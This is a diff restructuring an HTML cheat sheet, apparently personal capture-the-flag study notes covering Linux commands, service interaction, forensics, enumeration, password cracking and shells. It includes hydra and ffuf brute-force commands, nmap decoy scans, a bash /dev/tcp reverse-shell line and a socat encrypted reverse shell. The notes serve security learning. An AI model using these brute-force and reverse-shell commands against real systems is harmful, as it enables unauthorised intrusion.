@@ -10,7 +10,7 @@
 </head>
 <body>
 
-    <!-- Global Header Navigation -->
+    <!-- Global Navigation -->
     <header class="top-header">
         <div class="nav-container">
             <a href="index.html" class="logo">aurelstrigac.com</a>
@@ -46,10 +46,9 @@
         </aside>
 
         <div class="notes-wrapper">
-        <!-- Main Content Area -->
         <main class="notes-content">
 
-            <!-- Category Toggle Bar (iOS Segmented Control) -->
+            <!-- Category Toggle Bar -->
             <div class="category-toggle-container">
                 <button class="cat-toggle-btn active" data-category="all" onclick="setCategory('all')">All</button>
                 <button class="cat-toggle-btn" data-category="it" onclick="setCategory('it')">IT</button>
@@ -60,18 +59,24 @@
             <!-- Basic Commands -->
             <section id="basic-commands" class="content-section cat-it">
                 <h2>Basic Commands &amp; Protocols</h2>
-                
-                <h3>File Operations &amp; Search</h3>
-                <p>Common commands for finding files and interacting with the system environment.</p>
-                <pre><code># Basic syntax: find &lt;starting-directory&gt; &lt;options&gt; &lt;search-term&gt;
+
+                <details class="code-accordion">
+                    <summary>curl</summary>
+                    <pre><code># HTTP Request with parameters/headers
+curl -L &lt;url&gt; [-H "Cookie: value"] [-d "user=robert"]</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>find</summary>
+                    <pre><code># Basic syntax: find &lt;starting-directory&gt; &lt;options&gt; &lt;search-term&gt;
 # By Name or Extension:
 find / -name "flag.txt" 2&gt;/dev/null       -&gt; Exact match
 find / -iname "flag.txt" 2&gt;/dev/null      -&gt; Case-insensitive match
 find / -name "*.txt" 2&gt;/dev/null          -&gt; Wildcard search (all .txt files)
 
 # By User or Group:
-find / -user &lt;username> 2&gt;/dev/null       -&gt; Find files owned by specific user
-find / -group &lt;groupname> 2&gt;/dev/null     -&gt; Find files owned by specific group
+find / -user &lt;username&gt; 2&gt;/dev/null       -&gt; Find files owned by specific user
+find / -group &lt;groupname&gt; 2&gt;/dev/null     -&gt; Find files owned by specific group
 
 # By File Type:
 find / -type f -name "..." 2&gt;/dev/null    -&gt; Search for files only
@@ -86,138 +91,187 @@ find / -mtime -2 2&gt;/dev/null              -&gt; Files modified in the last 2 
 find / -size +50M 2&gt;/dev/null             -&gt; Find files larger than 50 Megabytes
 
 # Execute a command on found items:
-find / -name "*.bak" -exec cat {} +       -&gt; Find all .bak files and read them
+find / -name "*.bak" -exec cat {} +       -&gt; Find all .bak files and read them</code></pre>
+                </details>
 
-# Locate files using built-in search
-search -f &lt;filename&gt;</code></pre>
+                <details class="code-accordion">
+                    <summary>ftp</summary>
+                    <pre><code>ftp &lt;IP-addr&gt;</code></pre>
+                </details>
 
-                <h3>SSH, Telnet &amp; FTP</h3>
-                <pre><code># Standard SSH Connection
-ssh &lt;username&gt;@&lt;IP-adr&gt;
+                <details class="code-accordion">
+                    <summary>grep</summary>
+                    <pre><code>grep "search_term" &lt;file_path&gt;</code></pre>
+                </details>
 
-# Private Key Connection (Chmod required first)
-chmod 600 id_rsa
-ssh -i id_rsa &lt;username&gt;@&lt;IP-adr&gt;
-
-# Telnet connection
-telnet &lt;IP-adr&gt; [&lt;port-number&gt;] # e.g. POP3: 110, SMB: 445
-
-# FTP connection
-ftp &lt;IP-addr&gt;</code></pre>
-
-                <h3>Data Retrieval &amp; Network Tools</h3>
-                <pre><code># HTTP Request with parameters/headers
-curl -L &lt;url&gt; -H "Cookie: value" -d "user=robert"
-
-# Fetching files from remote hosts
-# For custom port, use: -P &lt;port_number&gt;
-scp &lt;username&gt;@&lt;IP-addr&gt;:&lt;/path/to/remote/image.png&gt; &lt;/path/to/local/destination/&gt;
-
-# Text searching
-grep "search_term" &lt;file_path&gt;
-
-# Archiving tools
-unzip &lt;filename&gt;
-7z x &lt;filename&gt;
-
-# DNS and Domain Lookup
-whois &lt;url-addr&gt;
-nslookup -type=A aurelstrigac.com 1.1.1.1
-dig aurelstrigac.com A
-
-# ICMP and Traceroute
-ping -c 4 -s 64 &lt;ip-addr&gt;
-traceroute &lt;ip-addr&gt;</code></pre>
-
-                <h3>Netcat (nc)</h3>
-                <pre><code># Listen Mode
+                <details class="code-accordion">
+                    <summary>nc (netcat)</summary>
+                    <pre><code># Listen Mode
 # Use -k to keep listening after client disconnects
 nc -lvnp &lt;port&gt;
 
 # Connect Mode
 nc &lt;ip-addr&gt; &lt;port&gt;</code></pre>
+                </details>
 
-                <h3>Systemctl</h3>
-                <pre><code># List running services
+                <details class="code-accordion">
+                    <summary>ping, traceroute</summary>
+                    <pre><code>ping [-c count] [-s size] &lt;ip-addr&gt;
+traceroute &lt;ip-addr&gt;</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>scp</summary>
+                    <pre><code>scp &lt;username&gt;@&lt;IP-addr&gt;:&lt;/path/to/remote/image.png&gt; [-P port] &lt;/path/to/local/destination/&gt;</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>search</summary>
+                    <pre><code>search -f &lt;filename&gt;</code></pre>
+                </details>
+                
+                <details class="code-accordion">
+                    <summary>ssh</summary>
+                    <pre><code>ssh &lt;username&gt;@&lt;IP-adr&gt;
+# Private Key Connection (Chmod required first)
+chmod 600 id_rsa
+ssh -i id_rsa &lt;username&gt;@&lt;IP-adr&gt;</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>systemctl</summary>
+                    <pre><code># List running services
 systemctl list-units --type=service --state=running
 
 # Investigate service status
 systemctl status &lt;service-name&gt;</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>telnet</summary>
+                    <pre><code>telnet &lt;IP-adr&gt; [port-number] # e.g. POP3: 110, SMB: 445</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>unzip, 7z, tar</summary>
+                    <pre><code># To compress:
+tar -cvf &lt;out.tar&gt; &lt;list-of-files-to-be-compressed&gt;
+# To decompress:
+unzip &lt;filename&gt;
+7z x &lt;filename&gt;
+tar xopf &lt;out.tar&lt;</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>whois, nslookup, dig</summary>
+                    <pre><code>whois &lt;url-addr&gt;
+nslookup -type=A aurelstrigac.com 1.1.1.1
+dig aurelstrigac.com A</code></pre>
+                </details>
             </section>
 
             <!-- Service Interaction -->
             <section id="service-interaction" class="content-section cat-it">
                 <h2>Service Interaction</h2>
-                
-                <h3>POP3 Protocol</h3>
-                <pre><code>USER &lt;username&gt;
+
+                <details class="code-accordion">
+                    <summary>FTP</summary>
+                    <a href="https://linuxize.com/cheatsheet/ftp/">Cheat-sheet</a>
+                    <p>When using the <span class="inline-code">PUT</span> command, ensure the file you intend to upload is in the local active directory from which you initiated the FTP session.</p>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>HTTP Manual Retrieval</summary>
+                    <pre><code>GET /filename HTTP/1.1
+Host: &lt;target_host&gt;</code></pre>
+                </details>
+
+                <details class="code-accordion">                
+                    <summary>POP3</summary>
+                    <pre><code>USER &lt;username&gt;
 PASS &lt;password&gt;
 LIST        # Lists emails
 RETR &lt;id&gt;   # Retrieves specific email
 QUIT        # Leaves session</code></pre>
-
-                <h3>FTP Protocol</h3>
-                <p>When using the <span class="inline-code">PUT</span> command, ensure the file you intend to upload is in the local active directory from which you initiated the FTP session.</p>
-
-                <h3>SMB Protocol</h3>
-                <pre><code># List available shares without authentication
-smbclient -L //&lt;IP-adr&gt; -N
-
-# Connect to a share with a user
+                </details>
+                
+                <details class="code-accordion">
+                    <summary>SMB</summary>
+                    <pre><code># Connect to a share with a user
 smbclient //&lt;IP-adr&gt;/&lt;ShareName&gt; -U &lt;username&gt;
-
 # In-session commands
+ls, pwd, cd...
 get &lt;file-name&gt;
 exit</code></pre>
-
-                <h3>HTTP Manual Retrieval</h3>
-                <pre><code>GET /filename HTTP/1.1
-Host: &lt;target_host&gt;</code></pre>
+                </details>
             </section>
 
             <!-- Common Tools -->
             <section id="common-tools" class="content-section cat-defensive">
                 <h2>Common Analysis &amp; Forensics Tools</h2>
-                
-                <h3>Audio Forensics</h3>
-                <pre><code># Create a spectrogram from an audio file
+                <details class="code-accordion">
+                    <summary>Audio Forensics</summary>
+                    <pre><code># Create a spectrogram from an audio file
 sox input.wav -n spectrogram -o output.png</code></pre>
+                </details>
 
-                <h3>Steganography</h3>
-                <pre><code># File inspection and header checks
+                <details class="code-accordion">
+                    <summary>Steganography</summary>
+                    <pre><code># PDF metadata
+pdfinfo &lt;file&gt;
+
+# Image metadata
+exiftool input.jpg
+
+# File inspection and header checks
 file &lt;file-name&gt;
 strings input.jpg | tail -n 20
 
-# UPX unpacking (if files are packed)
+# UPX unpacking (if files are packed; indicated by UPX! at the tail)
 upx -d &lt;filename&gt;
 
-# Image metadata and hidden extraction
-exiftool input.jpg
+# Extract files from PNG using foremost
+foremost &lt;image.png&gt;
+
+# Extract files from JPG
 steghide extract -sf input.jpg
 
 # Automated passphrase cracking on JPGs
 stegseek --crack file.jpg &lt;wordlist-path&gt;
 
 # Hex editor
-hexedit &lt;file-name&gt;
-
-# Extract files from PNG using foremost
-foremost &lt;image.png&gt;</code></pre>
-
-                <h3>Digital Forensics</h3>
-                <pre><code># PDF Metadata
-pdfinfo &lt;file&gt;
-
-# RAM dump analysis framework
-# Volatility is used for system memory analysis</code></pre>
+hexedit &lt;file-name&gt;</code></pre>
+                </details>
             </section>
 
             <!-- Enumeration -->
             <section id="enumeration" class="content-section cat-offensive">
                 <h2>Service Enumeration</h2>
-                
-                <h3>NMAP</h3>
-                <pre><code># Standard script and version scan
+
+                <details class="code-accordion">
+                    <summary>ffuf</summary>
+                    <pre><code># Subdomain discovery
+ffuf -u http://FUZZ.team.thm -w &lt;wordlist&gt; -fs 0 -k
+
+# Username enumeration (post request validation)
+ffuf -w &lt;wordlist&gt; -X POST -d "username=FUZZ&amp;email=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://&lt;IP&gt;/signup -mr "username already exists"
+
+# Password Bruteforce
+ffuf -w valid_users.txt:W1,passwords.txt:W2 -X POST -d "username=W1&amp;password=W2" -u http://&lt;IP&gt;/login -fc 200</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>gobuster</summary>
+                    <pre><code># Directory search
+gobuster dir -u http://&lt;IP-adr&gt; -w common.txt -r -x html,css,js,php,conf,txt
+
+# VHost search
+gobuster vhost -u "http://&lt;IP-adr&gt;" --domain target.thm -w &lt;wordlist&gt;</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>nmap</summary>
+                    <pre><code># Standard script and version scan
 nmap -sV -sC -oN scan.nmap &lt;IP-adr&gt;
 
 # Other TCP scan types
@@ -231,41 +285,33 @@ nmap -sX &lt;IP-adr&gt; # Xmas Scan (FIN, PSH, URG)
 nmap -PR -sn 10.10.10.0/24         # ARP scan
 nmap -PE -sn 10.10.10.0/24         # ICMP Echo Request
 nmap -D &lt;decoy1&gt;,&lt;decoy2&gt;,ME &lt;IP&gt;  # Decoy scan</code></pre>
+                </details>
 
-            <h3>Gobuster</h3>
-            <pre><code># Directory search
-gobuster dir -u http://&lt;IP-adr&gt; -w common.txt -r -x php,txt
-
-# VHost search
-gobuster vhost -u "http://&lt;IP-adr&gt;" --domain target.thm -w &lt;wordlist&gt;</code></pre>
-
-                <h3>ffuf</h3>
-                <pre><code># Subdomain discovery
-ffuf -u http://FUZZ.team.thm -w &lt;wordlist&gt; -fs 0 -k
-
-# Username enumeration (post request validation)
-ffuf -w &lt;wordlist&gt; -X POST -d "username=FUZZ&amp;email=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://&lt;IP&gt;/signup -mr "username already exists"
-
-# Password Bruteforce
-ffuf -w valid_users.txt:W1,passwords.txt:W2 -X POST -d "username=W1&amp;password=W2" -u http://&lt;IP&gt;/login -fc 200</code></pre>
-
-                <h3>SMB Shares Enumeration</h3>
-                <pre><code># Active shares scan (enum4linux)
+                <details class="code-accordion">
+                    <summary>SMB Shares Enumeration</summary>
+                    <pre><code># Active shares scan (enum4linux)
 enum4linux -a &lt;IP-adr&gt;
 
 # SMBMap share enumeration
-smbmap -H &lt;IP-adr&gt;</code></pre>
+smbmap -H &lt;IP-adr&gt;
+
+# smbclient - list available shares without authentication
+smbclient -L //&lt;IP-adr&gt; -N</code></pre>
+                </details>
             </section>
 
             <!-- Cracking -->
             <section id="cracking" class="content-section cat-offensive">
                 <h2>Password Cracking</h2>
-                
-                <h3>Hash Identification</h3>
-                <pre><code>python3 hash-id.py</code></pre>
 
-                <h3>Hydra</h3>
-                <pre><code># Bruteforce SSH
+                <details class="code-accordion">
+                    <summary>Hash Identification</summary>
+                    <pre><code>python3 hash-id.py</code></pre>
+                </details>
+
+                <details class="code-accordion">
+                    <summary>hydra</summary>
+                    <pre><code># Bruteforce SSH
 hydra -l &lt;username&gt; -P rockyou.txt &lt;IP-adr&gt; ssh
 
 # Bruteforce FTP
@@ -273,9 +319,11 @@ hydra -l &lt;username&gt; -P rockyou.txt ftp://&lt;IP-adr&gt;
 
 # Bruteforce Web Forms
 hydra -l &lt;username&gt; -P &lt;wordlist&gt; &lt;IP-adr&gt; http-post-form "/login:username=^USER^&amp;password=^PASS^:incorrect" -f -V</code></pre>
+                </details>
 
-                <h3>John the Ripper</h3>
-                <pre><code># General cracking
+                <details class="code-accordion">
+                    <summary>john</summary>
+                    <pre><code># General cracking
 john --wordlist=rockyou.txt hash.txt
 
 # Extract private key passphrase
@@ -290,6 +338,7 @@ john --format=sha512crypt --wordlist=rockyou.txt unshadowed.txt
 zip2john file.zip &gt; hash.txt
 rar2john file.rar &gt; hash.txt
 john --wordlist=rockyou.txt hash.txt</code></pre>
+                </details>
             </section>
 
             <!-- Shells & Payloads -->
@@ -311,7 +360,8 @@ os.system('/bin/bash -c "bash -i &gt;&amp; /dev/tcp/&lt;your-IP&gt;/&lt;your-por
                 <pre><code># Upgrade to TTY
 export TERM=xterm
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-# Next step: Press Ctrl+Z, run 'stty raw -echo; fg' and hit enter.</code></pre>
+# Ctrl+Z
+stty raw -echo; fg</code></pre>
 
                 <h3>Socat Encrypted Shells</h3>
                 <pre><code># Create self-signed cert on listener
@@ -329,7 +379,7 @@ socat OPENSSL:&lt;LHOST&gt;:&lt;LPORT&gt;,verify=0 EXEC:/bin/bash</code></pre>
             <section id="exploitation" class="content-section cat-offensive">
                 <h2>Exploitation Frameworks</h2>
                 
-                <h3>Metasploit Console</h3>
+                <h3>Metasploit</h3>
                 <pre><code># Start framework
 msfconsole
 
@@ -339,7 +389,8 @@ use &lt;module-path&gt;
 show payloads
 set payload &lt;payload&gt;
 show options
-exploit -j # Run in background</code></pre>
+set &lt;option&gt; &lt;value&gt;
+exploit</code></pre>
 
                 <h3>sqlmap</h3>
                 <pre><code># Find databases
